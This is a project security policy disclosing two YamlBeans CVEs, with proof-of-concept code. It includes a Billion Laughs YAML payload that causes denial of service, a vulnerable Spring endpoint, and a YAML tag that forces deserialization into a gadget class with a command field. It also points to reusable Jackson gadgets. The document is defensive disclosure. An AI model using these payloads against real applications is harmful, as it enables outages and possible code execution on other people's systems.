# Security Policy

## Reporting a Vulnerability

To report a vulnerability please contact security@contrastsecurity.com and please see our 
[Vulnerability Disclosure Policy
](https://www.contrastsecurity.com/disclosure-policy)


## CVE-2023-24620 Denial of Service

It is possible to perform a Denial of Service attack against an application using YamlBeans. This is through a entity expansion attack ( Billion Laughs ) similar to SnakeYaml's CVE-2017-18640.
The following is an example of a YAML Document
### POC
```yaml
lol1: &lol1 ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
lol2: &lol2 [*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1,*lol1]
lol3: &lol3 [*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2,*lol2]
lol4: &lol4 [*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3,*lol3]
lol5: &lol5 [*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4,*lol4]
lol6: &lol6 [*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5,*lol5]
lol7: &lol7 [*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6,*lol6]
lol8: &lol8 [*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7,*lol7]
lol9: &lol9 [*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8,*lol8]
lolz: &lolz [*lol9]
```
In the following code the Denial of Service occurs at the point the data is traversed on the line System.out.Println() as data.toString() is implicitly called, which reads through all elements to generate the toString().
This would also happen if any sort of recursive traversing of the data structure occured.
```java
@PostMapping("/loadYaml")
public void loadYaml(@RequestBody String yamlFile) throws YamlException {
    YamlReader reader = new YamlReader(new StringReader(yamlFile));
    Map<String, ?> data = (Map<String, ?>) reader.read();
    System.out.println(data);
}
```



## CVE-2023-24621 Untrusted Polymorphic Deserialization to Java Classes
Within YamlBeans it is possible for the YAML file to contain the Java Class the data will be deserialized to. The class name in the YAML file overrides any class specified by the developer. For example
### POC
```java
@PostMapping("/loadYamlAsSpecificClass")
public void loadYamlAsSpecificClass(@RequestBody String yamlFile) throws YamlException {
    YamlReader reader = new YamlReader(new StringReader(yamlFile));
    Config data = reader.read(Config.class);
    System.out.println(data);
}
```

The developer, in the above example would reasonably expect that the data was deserialized to the Config.class. This does not occur if the YAML contains a reference to another class.
The value in the YAML overrides both `reader.read(Config.class);` and `reader.read();`
```yaml
!com.contrast.labs.yamlbeanspoc.Gadget
cmd: "open /System/Applications/Calculator.app"
```
In the above YAML the class `com.contrast.labs.yamlbeanspoc.Gadget` is instantiated instead of Config.class, and the variable "cmd" is set via it's setter method `setCmd(String value)`

#### Potential Gadget Classes
By default YamlBeans expects the class to follow the JavaBeans spec of having :
* Public No Args Constructor
* Private variables.
* Getters/Setters that follow the JavaBean spec. e.g that match the variable name, but with getVariableName() setVariableName().

If they are missing or the setter does not match the underlying variable name, it will not set that value.
This is similar to Jackson-Databind’s polymorphic deserialization. But Jackson does not check the underlying variable name. Just looks for setter method and calls it with the supplied value. But within that list there should be several Jackson-Databind gadgets that can be reused.

